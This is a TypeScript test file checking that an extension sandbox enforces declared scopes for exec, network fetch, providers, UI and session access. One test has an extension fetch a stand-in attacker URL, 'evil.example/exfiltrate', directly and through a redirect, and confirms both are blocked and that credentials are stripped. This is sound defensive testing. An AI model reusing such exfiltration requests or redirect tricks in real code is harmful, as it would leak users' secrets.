// Contract tests for ticket 12 (capability manifest and sandbox).
//
// Seams under test:
//   - parseScopeManifest()/scope predicates in src/extensions/manifest.ts: the
//     declared scopes are the only source of truth for what an extension may
//     do; a missing manifest keeps old extensions fully working.
//   - ProjectTrustPrompt.render(): the approval modal must list the exact
//     scopes an extension declared, not a generic capability label.
//   - createExtensionAPI(): exec/fetch/provider/UI/session calls are gated at
//     the API boundary, and denied scopes fail with a typed, named error.
//   - ExtensionLoader.doctorJson(): labels legacy-unscoped extensions so a
//     user can tell which extensions run with every scope allowed.
//
// Each test pins a way an extension could gain a capability the user never
// approved, or a way an approved capability could silently stop working.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { basename, join } from "node:path";
import {
  EXTENSION_EXEC_MAX_BUFFER,
  EXTENSION_EXEC_TIMEOUT_MS,
  describeScopes,
  isCommandAllowed,
  isHostAllowed,
  isProviderAllowed,
  isSessionReadAllowed,
  isSessionWriteAllowed,
  isUIAllowed,
  parseScopeManifest,
  scopeModeForManifest,
} from "../../dist/extensions/manifest.js";
import {
  createExtensionAPI,
  createExtensionRegistries,
  type CreateExtensionAPIOptions,
} from "../../dist/extensions/api.js";
import { ExtensionLoader } from "../../dist/extensions/loader.js";
import { ProjectTrustPrompt } from "../../dist/cli/trust-prompt.js";
import { ExtensionCompatibilityError } from "../../dist/extensions/compatibility-error.js";
import type { ExecResult } from "../../dist/extensions/types.js";

function makeApi(options: CreateExtensionAPIOptions = {}) {
  const ctx = {
    workspace: "/tmp",
    trusted: true,
    hasUI: false,
    ui: {} as any,
    log: () => {},
  } as any;
  const api = createExtensionAPI(
    "sandbox-probe",
    ctx,
    createExtensionRegistries(),
    "s-sandbox",
    options,
  );
  api.ui = ctx.ui;
  return api;
}

test("scope manifest validates files, network, exec, providers, ui and session", () => {
  const parsed = parseScopeManifest({
    files: { read: ["src/**"], write: ["dist/**"] },
    network: { hosts: ["api.example.com"] },
    exec: { commands: ["git"] },
    providers: true,
    ui: false,
    session: { read: true, write: false },
  });
  assert.deepEqual(parsed.errors, []);
  assert.deepEqual(parsed.manifest, {
    files: { read: ["src/**"], write: ["dist/**"] },
    network: { hosts: ["api.example.com"] },
    exec: { commands: ["git"] },
    providers: true,
    ui: false,
    session: { read: true, write: false },
  });

  const bad = parseScopeManifest({
    network: { hosts: "not-an-array" },
    exec: { commands: [7] },
    session: { read: "yes" },
    providers: "yes",
  });
  assert.ok(
    bad.errors.length >= 4,
    `expected 4 errors, got ${bad.errors.join("; ")}`,
  );
});

test("omitted scopes are denied; a missing manifest stays legacy-unscoped", () => {
  assert.equal(scopeModeForManifest(undefined), "legacy-unscoped");
  const scoped = {
    exec: { commands: ["git"] },
    network: { hosts: ["a.test"] },
  };
  assert.equal(scopeModeForManifest(scoped), "scoped");

  assert.equal(isCommandAllowed(scoped, "git"), true);
  assert.equal(isCommandAllowed(scoped, "/usr/bin/git"), true);
  assert.equal(isCommandAllowed(scoped, "rm"), false);
  assert.equal(isHostAllowed(scoped, "a.test"), true);
  assert.equal(isHostAllowed(scoped, "b.test"), false);
  assert.equal(isProviderAllowed(scoped), false);
  assert.equal(isUIAllowed(scoped), false);
  assert.equal(isSessionReadAllowed(scoped), false);
  assert.equal(isSessionWriteAllowed(scoped), false);

  // Legacy extensions keep every scope; old extensions must not break.
  assert.equal(isCommandAllowed(undefined, "rm"), true);
  assert.equal(isHostAllowed(undefined, "b.test"), true);
  assert.equal(isProviderAllowed(undefined), true);
  assert.equal(isUIAllowed(undefined), true);
  assert.equal(isSessionReadAllowed(undefined), true);
  assert.equal(isSessionWriteAllowed(undefined), true);
});

test("trust prompt lists declared scopes instead of a generic capability label", () => {
  const decisions: string[] = [];
  const prompt = new ProjectTrustPrompt(
    [
      {
        id: "net-ext",
        entryPath: "/project/.atom-lite/extensions/net-ext",
        scopes: [
          "network: hosts [api.example.com]",
          "exec: commands [git]",
          "session: read",
        ],
      },
    ],
    "/project",
    (decision) => decisions.push(decision),
  );
  const text = prompt.render(200).join("\n");
  assert.match(text, /network: hosts \[api\.example\.com\]/);
  assert.match(text, /exec: commands \[git\]/);
  assert.match(text, /session: read/);
  assert.doesNotMatch(text, /no declared capabilities/);
  prompt.handleInput("n");
  assert.deepEqual(decisions, ["deny"]);
});

test("describeScopes renders the declared set for the trust prompt and doctor", () => {
  assert.deepEqual(describeScopes(undefined), [
    "legacy-unscoped (all scopes allowed)",
  ]);
  const lines = describeScopes({
    files: { read: ["src/**"], write: ["dist/**"] },
    network: { hosts: ["api.example.com"] },
    exec: { commands: ["git"] },
    providers: true,
    ui: true,
    session: { read: true, write: false },
  });
  assert.deepEqual(lines, [
    "files: read [src/**]",
    "files: write [dist/**]",
    "network: hosts [api.example.com]",
    "exec: commands [git]",
    "providers",
    "ui",
    "session: read",
  ]);
});

test("exec outside the declared command allowlist is rejected with the scope named", async () => {
  const api = makeApi({
    scopes: { exec: { commands: [basename(process.execPath)] } },
  });
  await assert.rejects(
    () => api.exec("definitely-not-allowed"),
    (error: unknown) => {
      assert.ok(error instanceof ExtensionCompatibilityError);
      assert.match(error.message, /exec/);
      return true;
    },
  );
  const ok = await api.exec(process.execPath, [
    "-e",
    "process.stdout.write('allowed')",
  ]);
  assert.equal(ok.stdout, "allowed");
});

test("fetch rejects a host that is not allowlisted and strips credentials", async () => {
  let seenAuthorization: string | undefined;
  const server = createServer((req, res) => {
    if (req.url === "/redirect") {
      res.writeHead(302, { location: "http://evil.example/exfiltrate" });
      res.end();
      return;
    }
    seenAuthorization = req.headers.authorization as string | undefined;
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("pong");
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = (server.address() as { port: number }).port;
  try {
    const api = makeApi({ scopes: { network: { hosts: ["127.0.0.1"] } } });
    await assert.rejects(
      () => api.fetch("http://evil.example/exfiltrate"),
      (error: unknown) => {
        assert.ok(error instanceof ExtensionCompatibilityError);
        assert.match(error.message, /network/);
        return true;
      },
    );
    const response = await api.fetch(`http://127.0.0.1:${port}/`, {
      headers: {
        Authorization: "Bearer host-secret",
        Cookie: "session=secret",
      },
    });
    assert.equal(response.status, 200);
    assert.equal(await response.text(), "pong");
    assert.equal(seenAuthorization, undefined);

    await assert.rejects(
      () => api.fetch(`http://127.0.0.1:${port}/redirect`),
      (error: unknown) => {
        assert.ok(error instanceof ExtensionCompatibilityError);
        assert.match(error.message, /evil\.example/);
        return true;
      },
    );
  } finally {
    await new Promise<void>((resolve) => server.close(() => resolve()));
  }
});

test("exec streams output and a turn abort stops the child process", async () => {
  const controller = new AbortController();
  const chunks: string[] = [];
  const api = makeApi({ signal: () => controller.signal });
  let result: ExecResult | undefined;
  await api
    .exec(
      process.execPath,
      ["-e", "process.stdout.write('ready'); setInterval(() => {}, 1000)"],
      {
        timeoutMs: 5000,
        onOutput: (_stream, text) => {
          chunks.push(text);
          if (text.includes("ready")) controller.abort();
        },
      },
    )
    .then((value) => {
      result = value;
    });
  assert.ok(chunks.join("").includes("ready"), "no streamed output received");
  assert.equal(result?.signal, "SIGTERM");
});

test("exec honours env overrides, per-call signals, and bounded output", async () => {
  const api = makeApi();
  const envResult = await api.exec(
    process.execPath,
    [
      "-e",
      "process.stdout.write(process.env.ATOM_SANDBOX_MARKER ?? 'missing')",
    ],
    { env: { ...process.env, ATOM_SANDBOX_MARKER: "ok" } },
  );
  assert.equal(envResult.stdout, "ok");

  const controller = new AbortController();
  const pending = api.exec(
    process.execPath,
    ["-e", "setInterval(() => {}, 1000)"],
    { signal: controller.signal },
  );
  controller.abort();
  const aborted = await pending;
  assert.equal(aborted.signal, "SIGTERM");

  const bounded = await api.exec(
    process.execPath,
    ["-e", "process.stdout.write('x'.repeat(1024))"],
    { maxBuffer: 32 },
  );
  assert.ok(bounded.stdout.length <= 32);
  assert.equal(EXTENSION_EXEC_TIMEOUT_MS, 30_000);
  assert.equal(EXTENSION_EXEC_MAX_BUFFER, 10 * 1024 * 1024);
});

test("provider, UI and session scopes gate their API surfaces", async () => {
  const closed = makeApi({ scopes: { exec: {} } });
  assert.throws(
    () => closed.registerProvider({ name: "blocked", config: {} }),
    (error: unknown) => {
      assert.ok(error instanceof ExtensionCompatibilityError);
      assert.match(error.message, /providers/);
      return true;
    },
  );
  assert.throws(
    () =>
      closed.registerWidget("aboveInput", {
        id: "w",
        location: "aboveInput",
        render: () => ["w"],
      }),
    /ui/,
  );
  await assert.rejects(async () => {
    await closed.select("title", ["a"]);
  }, /ui/);
  await assert.rejects(async () => {
    await closed.ui.select("title", ["a"]);
  }, /ui/);
  assert.throws(() => closed.appendEntry("note", 1), /session/);
  await assert.rejects(async () => {
    await closed.getSessionEntries();
  }, /session/);

  const open = makeApi({
    scopes: {
      providers: true,
      ui: true,
      session: { read: true, write: true },
    },
  });
  open.registerProvider({ name: "allowed", config: {} });
  open.registerWidget("aboveInput", {
    id: "w",
    location: "aboveInput",
    render: () => ["w"],
  });
  open.appendEntry("note", 1);
  assert.deepEqual(open.getSessionEntries(), [{ type: "note", data: 1 }]);
});

test("doctor labels legacy and scoped extensions with their declared scopes", async () => {
  const dir = mkdtempSync(join(tmpdir(), "atom-lite-scopes-"));
  try {
    writeFileSync(join(dir, "plain.js"), "export default () => {};\n");
    const pkgDir = join(dir, "scoped");
    mkdirSync(pkgDir, { recursive: true });
    writeFileSync(
      join(pkgDir, "package.json"),
      JSON.stringify({
        name: "scoped-ext",
        atom: {
          extensions: ["./index.js"],
          permissions: { network: { hosts: ["api.example.com"] } },
        },
      }),
    );
    writeFileSync(join(pkgDir, "index.js"), "export default () => {};\n");

    const loader = new ExtensionLoader({
      userDir: dir,
      agentDir: join(dir, "agent"),
    });
    await loader.loadAll();
    const entries = JSON.parse(loader.doctorJson());
    const plain = entries.find((entry: any) => entry.id === "plain");
    const scoped = entries.find((entry: any) => entry.id === "scoped");
    assert.equal(plain?.scopeMode, "legacy-unscoped");
    assert.deepEqual(plain?.scopes, ["legacy-unscoped (all scopes allowed)"]);
    assert.equal(scoped?.scopeMode, "scoped");
    assert.deepEqual(scoped?.scopes, ["network: hosts [api.example.com]"]);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
